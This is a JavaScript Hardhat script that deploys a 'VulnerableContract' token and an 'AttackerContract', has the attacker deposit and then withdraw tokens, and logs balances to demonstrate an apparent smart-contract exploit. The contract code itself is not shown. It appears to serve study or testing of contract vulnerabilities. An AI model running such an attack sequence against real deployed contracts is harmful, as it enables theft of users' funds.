/* global ethers */
/* eslint prefer-const: "off" */

const { BigNumber } = require("ethers");

async function deploy() {
  const VulnerableContract = await ethers.getContractFactory(
    "VulnerableContract"
  );
  const vulnerableContract = await VulnerableContract.deploy(
    "VulnerableContract",
    "VULN",
    {
      gasLimit: 10000000,
    }
  );
  await vulnerableContract.deployed();
  console.log("VulnerableContract deployed:", vulnerableContract.address);
  console.log(
    `VulnerableContract balance`,
    await vulnerableContract.balanceOf(vulnerableContract.address)
  );

  const AttackerContract = await ethers.getContractFactory("AttackerContract");
  const attackerContract = await AttackerContract.deploy(
    vulnerableContract.address,
    {
      gasLimit: 10000000,
    }
  );
  console.log("AttackerContract deployed:", attackerContract.address);
  await attackerContract.deployed();
  console.log(
    `Attacker balance`,
    await vulnerableContract.balanceOf(attackerContract.address)
  );
  console.log(`Depositing tokens to vulnerable contract...`);
  await attackerContract.depositTokensToVulnerableContract(
    vulnerableContract.address,
    BigNumber.from("1"),
    {
      gasLimit: 10000000,
    }
  );

  // Attacker has deposited 1 token to the vulnerable contract
  console.log(`Depositing tokens to vulnerable contract...done`);
  console.log(
    `Attacker balance`,
    await vulnerableContract.balanceOf(attackerContract.address)
  );
  console.log(
    `VulnerableContract balance`,
    await vulnerableContract.balanceOf(vulnerableContract.address)
  );
  console.log(
    `Deposited tokens`,
    await vulnerableContract.depositedTokens(attackerContract.address)
  );
  console.log(`Withdrawing tokens from vulnerable contract...`);
  await attackerContract.withdrawTokensFromVulnerableContract(
    vulnerableContract.address,
    {
      gasLimit: 10000000,
    }
  );
  console.log(`Withdrawing tokens from vulnerable contract...done`);
  console.log(
    `Vulnerable contract balance`,
    await vulnerableContract.balanceOf(vulnerableContract.address)
  );
  console.log(
    `Attacker balance`,
    await vulnerableContract.balanceOf(attackerContract.address)
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
if (require.main === module) {
  deploy()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

exports.deploy = deploy;
